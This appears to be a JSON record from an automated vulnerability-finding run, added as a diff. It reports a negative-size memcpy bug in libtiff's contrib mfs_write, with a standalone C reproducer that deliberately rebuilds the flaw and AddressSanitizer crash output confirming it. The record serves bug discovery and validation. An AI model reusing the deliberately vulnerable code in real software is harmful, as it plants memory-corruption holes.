@@ -1,0 +1,69 @@
+{
+  "baseline": "B3",
+  "vulnerability": {
+    "file": "contrib/mfs/mfs_file.c",
+    "line": 386,
+    "function": "mfs_write",
+    "bug_type": "heap-buffer-overflow",
+    "cwe": "CWE-122",
+    "confidence": "high",
+    "explanation": "Negative size is not rejected; memcpy receives a huge size_t due to signed-to-unsigned conversion. If no extension occurred, this writes beyond the allocated heap buffer (buf[fd]).",
+    "abs_path": "/tmp/libtiff_upstream/contrib/mfs/mfs_file.c"
+  },
+  "reproducer_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <errno.h>\n#include <stdint.h>\n\n/*\n This is a standalone minimal reconstruction of contrib/mfs/mfs_file.c logic\n to trigger the heap-buffer-overflow in mfs_write when given a negative size.\n*/\n\n#define MAX_FD 4\n\nstatic int   fds[MAX_FD];\nstatic char *buf[MAX_FD];\nstatic int   buf_size[MAX_FD];\nstatic int   buf_off[MAX_FD];\nstatic char  buf_mode[MAX_FD];\n\n/* Stub of extend_mem_file as in the original code. For this reproducer we won't\n   call it in the buggy path (condition is false when size is negative), but we\n   provide it for completeness. */\nstatic void extend_mem_file(int fd, int new_size)\n{\n    char *newbuf = (char *)realloc(buf[fd], (size_t)new_size);\n    if (!newbuf) {\n        perror(\"realloc\");\n        exit(1);\n    }\n    /* Zero-fill the newly added region for determinism. */\n    if (new_size > buf_size[fd]) {\n        memset(newbuf + buf_size[fd], 0xCD, (size_t)(new_size - buf_size[fd]));\n    }\n    buf[fd] = newbuf;\n}\n\n/* Vulnerable function re-implemented from contrib/mfs/mfs_file.c */\nint mfs_write(int fd, void *clnt_buf, int size)\n{\n    int ret;\n\n    if (fds[fd] == -1 || buf_mode[fd] == 'r')\n    {\n        /* Either the file is not open or it is opened for reading only */\n\n        ret = -1;\n        errno = EBADF;\n    }\n    else if (buf_mode[fd] == 'w')\n    {\n        /* Write */\n\n        if (buf_off[fd] + size > buf_size[fd])\n        {\n            extend_mem_file(fd, buf_off[fd] + size);\n            buf_size[fd] = (buf_off[fd] + size);\n        }\n\n        /* BUG: size is int; negative size passes to memcpy as a huge size_t */\n        memcpy((buf[fd] + buf_off[fd]), clnt_buf, size);\n        buf_off[fd] = buf_off[fd] + size;\n\n        ret = size;\n    }\n    else\n    {\n        /* Append */\n\n        if (buf_off[fd] != buf_size[fd])\n            buf_off[fd] = buf_size[fd];\n\n        extend_mem_file(fd, buf_off[fd] + size);\n        buf_size[fd] += size;\n\n        memcpy((buf[fd] + buf_off[fd]), clnt_buf, size);\n        buf_off[fd] = buf_off[fd] + size;\n\n        ret = size;\n    }\n\n    return (ret);\n}\n\nint main(void)\n{\n    /* Set up a single memory-backed file descriptor in write mode with a small buffer */\n    int fd = 0;\n    for (int i = 0; i < MAX_FD; i++) {\n        fds[i] = -1;\n        buf[i] = NULL;\n        buf_size[i] = 0;\n        buf_off[i] = 0;\n        buf_mode[i] = 'r';\n    }\n\n    /* Open-like initialization */\n    fds[fd] = fd;          /* mark as open */\n    buf_mode[fd] = 'w';    /* write mode */\n    buf_size[fd] = 16;     /* small destination buffer */\n    buf_off[fd] = 0;\n    buf[fd] = (char *)malloc((size_t)buf_size[fd]);\n    if (!buf[fd]) {\n        perror(\"malloc\");\n        return 1;\n    }\n    memset(buf[fd], 0xAA, (size_t)buf_size[fd]);\n\n    /* Small source buffer; large enough to reach first OOB write at dest */\n    size_t src_len = 32;\n    char *src = (char *)malloc(src_len);\n    if (!src) {\n        perror(\"malloc src\");\n        return 1;\n    }\n    memset(src, 0xBB, src_len);\n\n    /* Trigger: pass a negative size. The check (buf_off + size > buf_size)\n       will be false (e.g., 0 + (-1) > 16 is false), so no extension occurs.\n       memcpy receives size as a huge size_t, overrunning buf[fd]. */\n    int neg_size = -1;\n\n    fprintf(stderr, \"About to call mfs_write with negative size = %d (will convert to size_t)\\n\", neg_size);\n    /* This call should trigger AddressSanitizer heap-buffer-overflow */\n    int ret = mfs_write(fd, src, neg_size);\n\n    /* Normally unreachable if ASan aborts earlier; keep to avoid optimization */\n    fprintf(stderr, \"mfs_write returned %d, buf_off=%d, buf_size=%d\\n\", ret, buf_off[fd], buf_size[fd]);\n\n    free(src);\n    free(buf[fd]);\n    return 0;\n}\n",
+  "validation": {
+    "verdict": "CONCRETE_CONFIRMED",
+    "asan": {
+      "asan_triggered": true,
+      "exit_code": 1,
+      "elapsed": 1.4699573516845703,
+      "output": "About to call mfs_write with negative size = -1 (will convert to size_t)\n=================================================================\n==3827666==ERROR: AddressSanitizer: negative-size-param: (size=-1)\n    #0 0x5f06ea9e8fa8 in __asan_memcpy (/app/se_runs/b3/libtiff_f324415_vul/findings/mfs_file_386_heap-buffer-overflow/reproducer+0xa3fa8) (BuildId: 9151dc646901f7826b6c57fd1ba44a8bd2844cd0)\n    #1 0x5f06eaa260e2 in mfs_write /app/se_runs/b3/libtiff_f324415_vul/findings/mfs_file_386_heap-buffer-overflow/reproducer.c:60:9\n    #2 0x5f06eaa26dd9 in main /app/se_runs/b3/libtiff_f324415_vul/findings/mfs_file_386_heap-buffer-overflow/reproducer.c:124:15\n    #3 0x70a55722a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #4 0x70a55722a28a in __libc_start_main csu/../csu/libc-start.c:360:3\n    #5 0x5f06ea966324 in _start (/app/se_runs/b3/libtiff_f324415_vul/findings/mfs_file_386_heap-buffer-overflow/reproducer+0x21324) (BuildId: 9151dc646901f7826b6c57fd1ba44a8bd2844cd0)\n\n0x603000000040 is located 0 bytes inside of 32-byte region [0x603000000040,0x603000000060)\nallocated by thread T0 here:\n    #0 0x5f06ea9e9d32 in __interceptor_malloc (/app/se_runs/b3/libtiff_f324415_vul/findings/mfs_file_386_heap-buffer-overflow/reproducer+0xa4d32) (BuildId: 9151dc646901f7826b6c57fd1ba44a8bd2844cd0)\n    #1 0x5f06eaa26d44 in main /app/se_runs/b3/libtiff_f324415_vul/findings/mfs_file_386_heap-buffer-overflow/reproducer.c:110:25\n    #2 0x70a55722a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #3 0x70a55722a28a in __libc_start_main csu/../csu/libc-start.c:360:3\n    #4 0x5f06ea966324 in _start (/app/se_runs/b3/libtiff_f324415_vul/findings/mfs_file_386_heap-buffer-overflow/reproducer+0x21324) (BuildId: 9151dc646901f7826b6c57fd1ba44a8bd2844cd0)\n\nSUMMARY: AddressSanitizer: negative-size-param (/app/se_runs/b3/libtiff_f324415_vul/findings/mfs_file_386_heap-buffer-overflow/reproducer+0xa3fa8) (BuildId: 9151dc646901f7826b6c57fd1ba44a8bd2844cd0) in __asan_memcpy\n==3827666==ABORTING\n",
+      "error_type": "negative-size-param:",
+      "frames": [
+        [
+          "1",
+          "mfs_write",
+          "/app/se_runs/b3/libtiff_f324415_vul/findings/mfs_file_386_heap-buffer-overflow/reproducer.c:60",
+          "9"
+        ],
+        [
+          "2",
+          "main",
+          "/app/se_runs/b3/libtiff_f324415_vul/findings/mfs_file_386_heap-buffer-overflow/reproducer.c:124",
+          "15"
+        ],
+        [
+          "3",
+          "__libc_start_call_main",
+          "csu/../sysdeps/nptl/libc_start_call_main.h:58",
+          "16"
+        ],
+        [
+          "4",
+          "__libc_start_main",
+          "csu/../csu/libc-start.c:360",
+          "3"
+        ],
+        [
+          "1",
+          "main",
+          "/app/se_runs/b3/libtiff_f324415_vul/findings/mfs_file_386_heap-buffer-overflow/reproducer.c:110",
+          "25"
+        ],
+        [
+          "2",
+          "__libc_start_call_main",
+          "csu/../sysdeps/nptl/libc_start_call_main.h:58",
+          "16"
+        ],
+        [
+          "3",
+          "__libc_start_main",
+          "csu/../csu/libc-start.c:360",
+          "3"
+        ]
+      ],
+      "is_harness_artifact": false
+    }
+  }
+}
